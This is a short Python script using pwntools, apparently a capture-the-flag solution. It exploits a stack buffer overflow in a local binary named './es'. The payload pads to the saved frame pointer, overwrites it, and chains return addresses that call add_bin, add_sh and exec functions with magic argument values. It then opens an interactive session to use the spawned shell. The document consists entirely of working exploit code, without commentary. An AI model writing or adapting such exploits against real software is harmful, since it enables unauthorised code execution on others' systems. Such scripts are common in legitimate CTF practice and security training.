from pwn import *

payload = 'A'*0x6c		        # go to ebp
payload += 'BBBB'		        # overwrite ebp
payload += '\xa1\x91\x04\x08' 	# *add_bin
payload += '\x1e\x90\x04\x08'	# *pop; ret;
payload += '\xef\xbe\xad\xde'	# deadbeef
payload += '\xe8\x91\x04\x08'	# *add_sh
payload += '\x76\x91\x04\x08'	# *exec
payload += '\xbe\xba\xfe\xca'	# cafe babe
payload += '\x0d\xf0\xad\x0b'	# bad food

io = process(['./es', payload])
io.clean()
io.interactive()
